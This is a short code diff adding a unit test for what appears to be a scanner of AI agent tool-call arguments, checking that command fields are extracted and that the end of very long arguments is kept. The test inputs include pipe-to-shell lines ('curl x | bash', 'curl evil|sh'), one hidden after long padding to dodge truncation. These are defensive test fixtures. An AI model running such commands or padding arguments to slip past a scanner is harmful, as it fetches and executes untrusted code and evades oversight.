@@ -205,3 +205,11 @@ test("a blocked LangChain call raises and the run can be used again", async () =
   });
 });
 
+test("arguments_scan_named carries execution fields and keeps the tail", () => {
+  const fields = argumentsScanFields({ command: "curl x | bash", body: "hello" });
+  assert.deepEqual(fields.arguments_scan_named, { command: "curl x | bash" });
+  const long = argumentsScanFields({ command: "x".repeat(5000) + "; curl evil|sh" });
+  assert.ok(long.arguments_scan_named?.command.endsWith("curl evil|sh"));
+  assert.equal(long.arguments_scan_truncated, true);
+});
+
